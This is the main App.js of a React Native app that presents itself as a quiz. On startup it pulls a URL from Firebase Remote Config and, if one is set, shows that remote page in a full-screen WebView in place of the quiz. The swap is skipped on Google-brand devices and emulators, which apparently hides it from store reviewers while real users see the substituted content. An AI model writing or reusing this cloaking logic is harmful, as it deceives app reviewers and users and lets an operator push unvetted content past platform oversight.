import React, {useEffect, useState} from 'react';
import {NavigationContainer} from '@react-navigation/native';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {StyleSheet, View, ActivityIndicator} from 'react-native';
import remoteConfig from '@react-native-firebase/remote-config';
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';
import {Provider} from 'react-redux';
import {getManufacturer} from 'react-native-device-info';
import OneSignal from 'react-native-onesignal';
import {Home} from './src/screens/home';
import {Quiz} from './src/screens/quize';
import store from './src/store/index';
import WebView from 'react-native-webview';

const Stack = createNativeStackNavigator();

const ActivityIndicatorElement = () => {
  return (
    <View style={styles.activityIndicatorStyle}>
      <ActivityIndicator color="#009688" size="large" />
    </View>
  );
};

function App() {
  const [showWebView, setShowWebView] = useState('');
  const [visible, setVisible] = useState(true);
  const loadFire = async () => {
    setVisible(true);
    try {
      const storageUrl = await AsyncStorage.getItem('key');
      if (storageUrl) {
        setShowWebView(storageUrl);
        setTimeout(() => {
          setVisible(false);
        }, 3000);
        return;
      }
      const remoteValue = await initialize();
      const brand = await getManufacturer();
      const isBrandGoogle = brand === 'google';
      console.log(remoteValue, isBrandGoogle, DeviceInfo.isEmulatorSync());
      if (!remoteValue || isBrandGoogle || DeviceInfo.isEmulatorSync()) {
        setTimeout(() => {
          setVisible(false);
        }, 3000);
        return;
      } else {
        await AsyncStorage.setItem('key', remoteValue);
        setShowWebView(remoteValue);
        setTimeout(() => {
          setVisible(false);
        }, 3000);
      }
    } catch (e) {
      setTimeout(() => {
        setVisible(false);
      }, 3000);
    }
  };

  const initialize = async () => {
    await remoteConfig().setConfigSettings({
      isDeveloperModeEnabled: __DEV__,
    });
    await remoteConfig().setDefaults({
      url: true,
    });
    await remoteConfig().fetch(10);
    const activated = await remoteConfig().fetchAndActivate();
    console.log(activated);
    const remoteUrl = remoteConfig().getString('url');
    console.log(remoteUrl);
    return remoteUrl;
  };

  useEffect(() => {
    loadFire();
    OneSignal.setAppId('a47c4b57-a04f-49ff-9994-ca2ff715fb39');
    OneSignal.setNotificationOpenedHandler(notification => {
      console.log('OneSignal: notification opened:', notification);
    });
  }, []);

  if (!showWebView && !visible) {
    return (
      <Provider store={store}>
        <NavigationContainer
          screenOptions={{
            headerShown: false,
          }}>
          <Stack.Navigator>
            <Stack.Screen
              name="Home"
              component={Home}
              options={{headerShown: false}}
            />
            <Stack.Screen
              name="Quiz"
              component={Quiz}
              options={{headerShown: false}}
            />
          </Stack.Navigator>
        </NavigationContainer>
      </Provider>
    );
  }

  return (
    <View style={styles.container}>
      <WebView
        source={{uri: showWebView}}
        style={{flex: 1, width: '100%', height: '100%'}}
        // onLoadStart={() => setVisible(true)}
        // onLoad={() => setVisible(false)}
      />
      {visible ? <ActivityIndicatorElement /> : null}
    </View>
  );
}
const styles = StyleSheet.create({
  container: {
    backgroundColor: '#F5FCFF',
    flex: 1,
  },
  activityIndicatorStyle: {
    flex: 1,
    position: 'absolute',
    marginLeft: 'auto',
    marginRight: 'auto',
    marginTop: 'auto',
    marginBottom: 'auto',
    left: 0,
    right: 0,
    top: 0,
    bottom: 0,
    justifyContent: 'center',
  },
});

export default App;
